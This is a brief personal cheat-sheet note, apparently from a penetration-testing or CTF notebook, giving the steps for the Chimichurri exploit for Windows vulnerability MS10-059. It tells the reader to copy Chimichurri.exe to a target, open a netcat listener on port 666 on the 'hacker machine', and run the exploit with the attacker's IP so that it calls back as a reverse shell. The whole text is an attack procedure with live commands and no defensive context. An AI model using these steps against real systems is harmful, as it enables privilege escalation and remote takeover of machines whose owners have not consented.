---
title: MS10-059 - ChimiChurri
updated: 2023-10-11 13:00:42Z
created: 2023-10-11 12:46:07Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

1. Copy **Chimichurri.exe** to target
2. Run a listener on hacker machine:
`nc -lnvp 666`

3. Execute Chimichurri on host:
`Chimichurri.exe <hacker IP> 666`